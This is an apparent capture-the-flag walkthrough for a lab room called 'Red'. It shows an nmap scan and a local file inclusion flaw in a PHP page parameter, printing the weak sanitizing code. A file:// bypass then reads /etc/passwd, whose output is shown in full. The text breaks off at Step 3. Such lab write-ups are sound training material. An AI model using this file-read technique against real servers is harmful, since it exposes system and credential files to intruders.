# Room: Red
<i>A classic battle for the ages.</i>
### Description

<blockquote>
The match has started, and Red has taken the lead on you.[space][space]
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
</blockquote>

#### What To Do:
Step 1:
###### Run a **simple nmap scan** on the targets ip to check for **common ports opened**<br>we can always scan later again, if necessary.
```
nmap <target-ip>
```
###### Output:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
###### Ah, we can assume port 80 is a http
Step 2:
###### Put the targets-ip in your browser
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/567a2646-c5d3-405a-880d-950d6b992eff)
###### 1. The first thing to notice is that the url has change(we were redirected)<br>2. The second thing to notice is that the url has a get parameter "?page=home.html", This could be a possible vulnerability.
##### Lets Test for Local File Inclusion(LFI)
###### lets use curl on index.php file to check
```
curl http://target-ip/index.php?page=index.php
```
###### Output:
```
<?php

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```
###### 1. As we read the function 'sanitize_input' it removes '../' and then removes './'<br>2. We see the 'sanitize_input' being used after 'preg_match' php built-in function that searches for expressions in strings<br>3. So is going to avoid us from inputting symbols, numbers before letters.
###### However we could still do this
```
curl http://target-ip/index.php?page=file:///var/www/html/index.php
```
###### That worked but now lets do...
```
curl http://target-ip/index.php?page=file:///etc/passwd
```
###### Output
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```
###### Ha ha, we get users blue and red
Step 3:<br>



